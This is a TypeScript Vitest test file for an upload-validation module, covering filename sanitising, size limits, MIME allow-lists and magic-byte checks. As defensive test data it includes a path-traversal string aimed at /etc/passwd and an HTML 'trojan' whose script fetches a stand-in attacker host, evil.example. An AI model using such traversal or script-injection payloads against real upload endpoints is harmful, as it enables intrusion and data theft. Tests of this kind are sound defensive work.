import { describe, expect, it } from 'vitest';
import { AppError } from '@lab/shared';
import { sanitiseFilename, validateUpload, type UploadRules } from './upload.js';

const rules: UploadRules = { maxBytes: 1024, allowedTypes: ['application/pdf', 'text/plain'] };
const pdfBytes = (size = 32) => {
  const bytes = new Uint8Array(size);
  bytes.set([0x25, 0x50, 0x44, 0x46]); // %PDF
  return bytes;
};
const textBytes = (s: string) => new TextEncoder().encode(s);

describe('sanitiseFilename', () => {
  it('strips directory traversal', () => {
    expect(sanitiseFilename('../../etc/passwd')).toBe('passwd');
    expect(sanitiseFilename('C:\\Windows\\System32\\cmd.exe')).toBe('cmd.exe');
  });

  it('never returns an empty name', () => {
    expect(sanitiseFilename('...')).toBe('file');
    expect(sanitiseFilename('')).toBe('file');
  });
});

describe('validateUpload', () => {
  it('accepts a genuine PDF', () => {
    expect(() =>
      validateUpload(
        { filename: 'invoice.pdf', mimeType: 'application/pdf', bytes: pdfBytes() },
        rules,
      ),
    ).not.toThrow();
  });

  it('rejects a file above the size cap with an actionable message', () => {
    try {
      validateUpload(
        { filename: 'big.pdf', mimeType: 'application/pdf', bytes: pdfBytes(2048) },
        rules,
      );
      expect.unreachable();
    } catch (error) {
      expect((error as AppError).code).toBe('PAYLOAD_TOO_LARGE');
      expect((error as AppError).userMessage).toMatch(/limit is/);
    }
  });

  it('rejects a disallowed MIME type', () => {
    expect(() =>
      validateUpload(
        { filename: 'app.exe', mimeType: 'application/octet-stream', bytes: pdfBytes() },
        rules,
      ),
    ).toThrow(/Rejected MIME type/);
  });

  // THE test that matters: a client can lie about filename and Content-Type,
  // but it cannot forge the first four bytes of a real PDF.
  it('rejects HTML masquerading as a PDF', () => {
    const trojan = textBytes('<!doctype html><script>fetch("//evil.example")</script>');
    try {
      validateUpload(
        { filename: 'invoice.pdf', mimeType: 'application/pdf', bytes: trojan },
        rules,
      );
      expect.unreachable('magic-byte check must reject this');
    } catch (error) {
      expect((error as AppError).code).toBe('UNSUPPORTED_MEDIA_TYPE');
      expect((error as AppError).message).toMatch(/signature/);
    }
  });

  it('rejects markup uploaded as plain text', () => {
    expect(() =>
      validateUpload(
        { filename: 'notes.txt', mimeType: 'text/plain', bytes: textBytes('<html><body>hi') },
        rules,
      ),
    ).toThrow(/Markup content rejected/);
  });

  it('rejects an empty file', () => {
    expect(() =>
      validateUpload(
        { filename: 'x.txt', mimeType: 'text/plain', bytes: new Uint8Array(0) },
        rules,
      ),
    ).toThrow(/Empty upload/);
  });
});
